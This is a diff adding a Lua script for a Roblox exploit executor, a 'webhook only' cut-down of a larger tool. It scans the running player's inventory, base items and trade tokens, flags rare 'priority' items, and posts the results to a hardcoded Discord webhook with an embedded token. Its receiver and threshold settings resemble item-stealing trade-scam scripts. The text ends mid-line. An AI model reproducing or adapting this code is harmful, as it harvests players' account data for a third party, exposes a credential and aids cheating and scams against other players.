@@ -1,0 +1,158 @@
+--[[
+    ELYSIUM ETFB - WEBHOOK ONLY EDITION
+    Stripped of all trade/pickup logic. 
+    Focuses only on scanning inventory/base and reporting to Discord.
+]]
+
+-- CONFIGURATION
+getgenv().WEBHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+getgenv().RECEIVERS = {"User1"} -- Placeholder
+getgenv().THRESHOLD = 0         -- Set to 0 for instant pinging
+getgenv().HIGHTIERONLY = false  -- Set to false to see all items in the report
+getgenv().TOKEN_THRESHOLD = 0   -- Ping for any tokens
+
+-- SERVICES
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- MODULES (Required for rate calculation and name lookups)
+local ClientGlobals  = require(ReplicatedStorage.Client.Modules.ClientGlobals)
+local EconomyMath    = require(ReplicatedStorage.Shared.utils.EconomyMath)
+local EternityNum    = require(ReplicatedStorage.SharedModules.EternityNum)
+local BrainrotModule = require(ReplicatedStorage.SharedModules.BrainrotModule)
+
+-- CONFIG LOCALS
+local WEBHOOK_URL = getgenv().WEBHOOK
+local TRADE_RATE_THRESHOLD = getgenv().THRESHOLD
+local TOKEN_THRESHOLD = getgenv().TOKEN_THRESHOLD
+local HIGH_TIER_ONLY = getgenv().HIGHTIERONLY
+local TARGET_PLAYERS = getgenv().RECEIVERS
+
+local PRIORITY_BRAINROTS = {
+    "Anububu", "Meta Technetta", "Noobini Infeeny", 
+    "Magmew", "Don Magmito", "Doomini Tiktookini"
+}
+
+local function isPriorityBrainrot(name)
+    for _, n in ipairs(PRIORITY_BRAINROTS) do
+        if string.find(name, n, 1, true) then return true end
+    end
+    return false
+end
+
+--------------------------------------------------------------
+-- DATA GATHERING
+--------------------------------------------------------------
+
+local function getBrainrotInfo(brainrotData)
+    if not brainrotData then return nil end
+    local name = brainrotData.name or "Unknown"
+    local class = BrainrotModule.GetBrainrotClass(name)
+
+    local ok, rate = pcall(function() return EconomyMath.GetBrainrotRate(brainrotData) end)
+    if not ok or not rate then
+        local ok2, r2 = pcall(function() return BrainrotModule.GetRate(brainrotData) end)
+        rate = (ok2 and r2) or 0
+    end
+
+    local traits = brainrotData.traits or ""
+    local hasGalaxyTrait = false
+    if type(traits) == "string" then
+        hasGalaxyTrait = string.find(traits, "Galaxy") ~= nil
+    elseif type(traits) == "table" then
+        for _, t in ipairs(traits) do if t == "Galaxy" then hasGalaxyTrait = true break end end
+    end
+
+    return {
+        name = name,
+        class = class,
+        rate = rate,
+        rateFormatted = EternityNum.short(EternityNum.fromNumber(rate)),
+        isPriority = isPriorityBrainrot(name),
+        isGalaxy = (class == "Divine" or class == "Infinity") and hasGalaxyTrait,
+        isScaledDivineInfinity = (class == "Divine" or class == "Infinity") and (brainrotData.scale or 1) >= 3,
+        meetsThreshold = rate >= TRADE_RATE_THRESHOLD
+    }
+end
+
+local function getInventoryItems()
+    local items = {}
+    local inventory = ClientGlobals.PlayerData:TryIndex({"Inventory"}) or {}
+    for id, item in pairs(inventory) do
+        if item.name and item.sub and item.sub.level then
+            local info = getBrainrotInfo({
+                name = item.name,
+                level = item.sub.level,
+                mutation = item.sub.mutation,
+                scale = item.sub.scale,
+                traits = item.sub.traits
+            })
+            if info then table.insert(items, info) end
+        end
+    end
+    return items
+end
+
+local function getBaseItems()
+    local items = {}
+    local plotData = ClientGlobals.Plots.Data
+    local myPlot = nil
+    for _, p in pairs(plotData) do if p.player == LocalPlayer then myPlot = p break end end
+    
+    if myPlot then
+        local stands = ClientGlobals.Plots:TryIndex({myPlot.plotModel.Name, "data", "Stands"}) or {}
+        for _, slotData in pairs(stands) do
+            if slotData.brainrot then
+                local info = getBrainrotInfo(slotData.brainrot)
+                if info then table.insert(items, info) end
+            end
+        end
+    end
+    return items
+end
+
+--------------------------------------------------------------
+-- WEBHOOK CORE
+--------------------------------------------------------------
+
+local function sendWebhook(content, embed)
+    local requestFunc = (syn and syn.request) or http_request or request
+    if not requestFunc then return end
+
+    pcall(function()
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = content, embeds = {embed}})
+        })
+    end)
+end
+
+local function formatLine(item)
+    local star = item.isGalaxy and "🌌 " or (item.isPriority and "⭐ " or "")
+    return string.format("%s[%s] %s ➜ $%s/s", star, item.class or "?", item.name, item.rateFormatted)
+end
+
+local function runReport()
+    local inv = getInventoryItems()
+    local base = getBaseItems()
+    local tokens = ClientGlobals.PlayerData:TryIndex({"TradeTokens"}) or 0
+    
+    local invLines = {}
+    for i=1, math.min(10, #inv) do table.insert(invLines, formatLine(inv[i])) end
+    if #inv > 10 then table.insert(invLines, "...and " .. (#inv-10) .. " more") end
+
+    local baseLines = {}
+    for i=1, math.min(10, #base) do table.insert(baseLines, formatLine(base[i])) end
+    if #base > 10 then table.insert(baseLines, "...and " .. (#base-10) .. " more") end
+
+    local embed = {
+        title = "🚀 ETFB Inventory Scan",
+        color = 0x00FFAC,
+        fields = {
+            {
+                name = "👤 Player",
+                value = string.format("
